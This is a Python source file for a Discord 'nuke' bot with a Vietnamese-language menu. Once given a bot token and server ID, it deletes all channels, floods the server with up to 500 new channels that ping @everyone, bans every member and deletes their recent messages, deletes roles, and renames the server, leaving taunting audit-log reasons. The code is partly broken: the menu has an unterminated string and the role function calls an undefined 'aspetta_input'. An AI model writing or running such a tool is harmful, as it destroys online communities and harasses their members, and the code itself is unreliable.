# Dev by The Duc 
import discord
import asyncio
import os
import platform
import time
from colorama import init, Fore


def clear_once():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

init(autoreset=True)


def show_banner():
    lines = [
        " ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ ",
        " ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗",
        " ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║",
        " ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║",
        " ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝",
        " ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ "
    ]
    for line in lines:
        for char in line:
            print(char, end="", flush=True)
            time.sleep(0.005)
        print()
        time.sleep(0.1)
    print(f"{Fore.CYAN}╔{'═' * 58}╗")
    print(f"{Fore.CYAN}║{Fore.GREEN}{' Discord Tool by The Duc ':^58}{Fore.CYAN}║")
    print(f"{Fore.CYAN}╚{'═' * 58}╝\n")

# KIỂM TRA TOKEN BOT
async def async_input(prompt=""):
    return await asyncio.get_event_loop().run_in_executor(None, input, prompt)


async def get_token_async():
    while True:
        token = await async_input(f"{Fore.WHITE}Nhập Token bot: {Fore.WHITE}")
        token = token.strip()
        if not token:
            print(f"{Fore.RED}Đéo có token bot chạy kiểu gì ")
            await asyncio.sleep(1.5)
            continue
        return token

# CẤU HÌNH BOT
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.members = True
intents.bans = True

client = discord.Client(intents=intents)

# TỰ ĐỘNG CONNECT KHI MẤT KẾT NỐI
@client.event
async def on_disconnect():
    print(f"\n{Fore.RED}Mất kết nối với Discord... Đang thử kết nối lại...")

@client.event
async def on_resumed():
    print(f"{Fore.GREEN}Đã kết nối lại thành công!")

# MENU TOOL
async def show_main_menu(guild):
    while True:
        clear_once()
        show_banner()
        print(f"{Fore.CYAN}═" * 70)
        print(f"{Fore.MAGENTA}{' MENU CHÍNH - DISCORD TOOL ':^68}")
        print(f"{Fore.CYAN}═" * 70)
        print(f"{Fore.GREEN}1. Nuke server")
        print(f"{Fore.RED}2. Ban tất cả")
        print(f"{Fore.YELLOW}3. Xóa tất cả role")
        print(f"{Fore.BLUE}4. Đổi tên server")
        print(f"{Fore.MAGENTA}5. Thực hiện nhiều chức năng")
        print(f"{Fore.RED}6. Thoát")
        print(f"{Fore.CYAN}═" * 70)
        print(f"{Fore.CYAN}Bấm Ctrl C để thoát tool ngay lập tức khi cần)

        choice = await async_input(f"\n{Fore.YELLOW}Chọn (1-6): {Fore.WHITE}")
        choice = choice.strip()

        if choice == "1": await nuke_channels(guild)
        elif choice == "2": await ban_all_members(guild)
        elif choice == "3": await delete_all_roles(guild)
        elif choice == "4": await rename_server(guild)
        elif choice == "5": await custom_actions(guild)
        elif choice == "6":
            clear_once()
            show_banner()
            print(f"\n{Fore.RED}Thoát thành công!")
            await async_input(f"{Fore.YELLOW}Nhấn Enter...")
            break
        else:
            print(f"{Fore.RED}Lựa chọn không hợp lệ!")
        await async_input(f"{Fore.YELLOW}Enter để tiếp tục...")


@client.event
async def on_ready():
    print(f"\n{Fore.GREEN}Đăng nhập thành công: {Fore.WHITE}{client.user}")
    
    if len(client.guilds) == 0:
        print(f"{Fore.RED}Bot chưa được mời vào server nào!")
        await async_input(f"\n{Fore.YELLOW}Nhấn Enter để thoát...")
        await client.close()
        return

    while True:
        try:
            server_id_input = await async_input(f"{Fore.YELLOW}Nhập ID Server: {Fore.WHITE}")
            server_id_input = server_id_input.strip()
            if server_id_input.lower() == 'q':
                await client.close()
                return
            server_id = int(server_id_input)
            guild = discord.utils.get(client.guilds, id=server_id)
            if not guild:
                print(f"{Fore.RED}Không tìm thấy server với ID: {server_id}")
                await asyncio.sleep(1.5)
                continue

            owner = guild.owner.name if guild.owner else "Không rõ"
            print(f"\n{Fore.GREEN}Đã chọn server:")
            print(f"{Fore.CYAN}   Tên: {Fore.WHITE}{guild.name}")
            print(f"{Fore.CYAN}   ID: {Fore.YELLOW}{guild.id}")
            print(f"{Fore.CYAN}   Chủ: {Fore.WHITE}{owner}")
            print(f"{Fore.CYAN}   Thành viên: {Fore.WHITE}{guild.member_count}\n")

            confirm = await async_input(f"{Fore.YELLOW}Tiếp tục? (y/n): {Fore.WHITE}")
            if confirm.strip().lower() != 'y':
                print(f"{Fore.RED}Đã hủy.")
                await asyncio.sleep(1.5)
                continue
            break
        except ValueError:
            print(f"{Fore.RED}ID phải là số!")
            await asyncio.sleep(1.5)
        except Exception as e:
            print(f"{Fore.RED}Lỗi: {e}")
            await asyncio.sleep(1.5)

    # KIỂM TRA QUYỀN
    bot = guild.get_member(client.user.id)
    perms = discord.Permissions(manage_channels=True, manage_roles=True, ban_members=True, manage_guild=True, administrator=True)
    if not bot.guild_permissions >= perms:
        missing = [p for p, v in perms if not getattr(bot.guild_permissions, p, False)]
        print(f"{Fore.RED}Bot thiếu quyền: {', '.join(missing)}")
        await async_input(f"\n{Fore.YELLOW}Enter để thoát...")
        await client.close()
        return

    await show_main_menu(guild)
    await client.close()

# 1. NUKE KÊNH
async def nuke_channels(guild):
    print(f"\n{Fore.CYAN}═" * 70)
    print(f"{Fore.MAGENTA} NUKE KÊNH")
    print(f"{Fore.CYAN}═" * 70)
    if (await async_input(f"{Fore.RED}Xác nhận xóa tất cả kênh? (y/n): {Fore.WHITE}")).lower() != 'y':
        return

    print(f"\n{Fore.YELLOW}Đang xóa kênh...")
    deleted = 0
    for ch in guild.channels[:]:
        try:
            await ch.delete(reason="Nuke by @Tarin.deve")
            print(f"{Fore.GREEN}Xóa: {Fore.WHITE}{ch.name} {Fore.CYAN}({ch.type})")
            deleted += 1
            await asyncio.sleep(0.1)
        except Exception as e:
            print(f"{Fore.RED}Lỗi xóa: {ch.name} → {e}")
    print(f"{Fore.GREEN}Đã xóa {deleted} kênh.\n")

    name = (await async_input(f"{Fore.YELLOW}Tên kênh mới: {Fore.WHITE}")) or "Tarin on Top"
    name = name.replace(" ", "-")
    msg = (await async_input(f"{Fore.YELLOW}Tin nhắn ping: {Fore.WHITE}")) or "Server đã bị nuke bởi @Tarin.deve"
    try: num = int(await async_input(f"{Fore.YELLOW}Số kênh tạo (1-500): {Fore.WHITE}"))
    except: num = 10

    print(f"\n{Fore.YELLOW}Đang tạo {num} kênh...")
    created = 0
    for _ in range(min(num, 500)):
        try:
            ch = await guild.create_text_channel(name)
            await ch.send(f"@everyone {msg}")
            print(f"{Fore.GREEN}Tạo: #{name}")
            created += 1
            await asyncio.sleep(0)
        except Exception as e:
            print(f"{Fore.RED}Lỗi tạo kênh: {e}")
            break
    print(f"{Fore.GREEN}Đã tạo {created} kênh!")

# BAN ALL MEMBERS
async def ban_all_members(guild):
    print(f"\n{Fore.CYAN}═" * 70)
    print(f"{Fore.MAGENTA} BAN TẤT CẢ THÀNH VIÊN")
    print(f"{Fore.CYAN}═" * 70)
    if (await async_input(f"{Fore.RED}Xác nhận ban tất cả? (y/n): {Fore.WHITE}")).lower() != 'y':
        return

    reason = (await async_input(f"{Fore.YELLOW}Lý do ban: {Fore.WHITE}")) or "Tarin là bố của chúng mày"
    print(f"\n{Fore.YELLOW}Đang ban... (trừ chủ + bot)")

    banned = skipped = 0
    for member in guild.members:
        if member == guild.owner or member == client.user or member.bot:
            skipped += 1
            continue
        try:
            await member.ban(reason=reason, delete_message_days=7)
            print(f"{Fore.GREEN}Ban: {Fore.WHITE}{member}")
            banned += 1
            await asyncio.sleep(0.8)
        except discord.Forbidden:
            print(f"{Fore.RED}Không đủ quyền: {member}")
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"{Fore.YELLOW}Rate limit! Đợi 5s...")
                await asyncio.sleep(5)
            else:
                print(f"{Fore.RED}Lỗi: {e}")
        except Exception as e:
            print(f"{Fore.RED}Lỗi: {e}")

    print(f"{Fore.GREEN}Đã ban {banned}, bỏ qua {skipped}.")

# 3. XOÁ TẤT CẢ ROLE
async def delete_all_roles(guild):
    print(f"\n{Fore.CYAN}═" * 70)
    print(f"{Fore.MAGENTA} XÓA TẤT CẢ ROLE")
    print(f"{Fore.CYAN}═" * 70)
    if (await aspetta_input(f"{Fore.RED}Xác nhận xóa tất cả role? (y/n): {Fore.WHITE}")).lower() != 'y':
        return

    print(f"\n{Fore.YELLOW}Đang xóa role...")
    deleted = 0
    for role in guild.roles:
        if role.is_default() or role.managed or role >= guild.get_member(client.user.id).top_role:
            print(f"{Fore.CYAN}Bỏ qua: @{role.name}")
            continue
        try:
            await role.delete(reason="Tarin là bố ")
            print(f"{Fore.GREEN}Xóa role: @{role.name}")
            deleted += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"{Fore.RED}Lỗi xóa: @{role.name} → {e}")
    print(f"{Fore.GREEN}Đã xóa {deleted} role.")

# 4. RENAME SERVER
async def rename_server(guild):
    print(f"\n{Fore.CYAN}═" * 70)
    print(f"{Fore.MAGENTA} ĐỔI TÊN SERVER")
    print(f"{Fore.CYAN}═" * 70)
    new_name = (await async_input(f"{Fore.YELLOW}Tên mới (tối đa 100 ký tự): {Fore.WHITE}")).strip()
    if not new_name or len(new_name) > 100:
        print(f"{Fore.RED}Tên không hợp lệ!")
        return
    if (await async_input(f"{Fore.YELLOW}Xác nhận đổi thành '{new_name}'? (y/n): {Fore.WHITE}")).lower() != 'y':
        return

    try:
        await guild.edit(name=new_name, reason="Tarin là bố")
        print(f"{Fore.GREEN}Đổi tên thành công: {new_name}")
    except Exception as e:
        print(f"{Fore.RED}Không đủ quyền hoặc lỗi: {e}")

# 5. ĐA CHỨC NĂNG
async def custom_actions(guild):
    print(f"\n{Fore.CYAN}═" * 70)
    print(f"{Fore.MAGENTA} THỰC HIỆN NHIỀU CHỨC NĂNG")
    print(f"{Fore.CYAN}═" * 70)
    print(f"{Fore.GREEN}1 → Nuke kênh")
    print(f"{Fore.RED}2 → Ban tất cả")
    print(f"{Fore.YELLOW}3 → Xóa role")
    print(f"{Fore.BLUE}4 → Đổi tên server")
    print(f"{Fore.WHITE}Ví dụ: 1+2, 2+3+4, all, q")
    print(f"{Fore.CYAN}═" * 70)

    while True:
        choice = (await async_input(f"\n{Fore.YELLOW}Nhập: {Fore.WHITE}")).strip().lower()
        if choice == 'q': 
            return
        if choice == 'all':
            actions = [1,2,3,4]
            break
        try:
            actions = [int(x) for x in choice.replace('+',' ').split() if x.isdigit()]
            if all(1 <= a <= 4 for a in actions) and actions:
                break
        except: pass
        print(f"{Fore.RED}Sai định dạng!")

    names = {1: "Nuke kênh", 2: "Ban tất cả", 3: "Xóa role", 4: "Đổi tên"}
    print(f"\n{Fore.MAGENTA}Thực hiện: {Fore.WHITE}{', '.join(names[a] for a in actions)}")
    if (await async_input(f"{Fore.YELLOW}Xác nhận? (y/n): {Fore.WHITE}")).lower() != 'y':
        return

    for act in actions:
        print(f"\n{Fore.CYAN}{'='*20} BẮT ĐẦU {act} {'='*20}")
        if act == 1: await nuke_channels(guild)
        elif act == 2: await ban_all_members(guild)
        elif act == 3: await delete_all_roles(guild)
        elif act == 4: await rename_server(guild)
        print(f"{Fore.CYAN}{'='*20} HOÀN TẤT {act} {'='*20}\n")

    print(f"{Fore.GREEN}HOÀN TẤT TẤT CẢ!")

# CHẠY CHÍNH VỚI RECONNECT
async def main():
    clear_once()
    show_banner()

    while True:
        token = await get_token_async()
        try:
            print(f"\n{Fore.YELLOW}Đang kết nối với Discord...")
            await client.start(token, reconnect=True)  # TỰ ĐỘNG RECONNECT
            break
        except discord.LoginFailure:
            clear_once()
            print(f"{Fore.RED}TOKEN SAI HOẶC HẾT HẠN!\n")
            await asyncio.sleep(1.5)
        except discord.HTTPException as e:
            clear_once()
            if "401" in str(e):
                print(f"{Fore.RED}TOKEN KHÔNG HỢP LỆ!\n")
            else:
                print(f"{Fore.RED}Lỗi kết nối: {e}\n")
            await asyncio.sleep(1.5)
        except Exception as e:
            clear_once()
            print(f"{Fore.RED}Lỗi: {e}\n")
            await asyncio.sleep(1.5)

# CHẠY
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:

        print(f"\n{Fore.RED}Đã dừng bởi người dùng.")
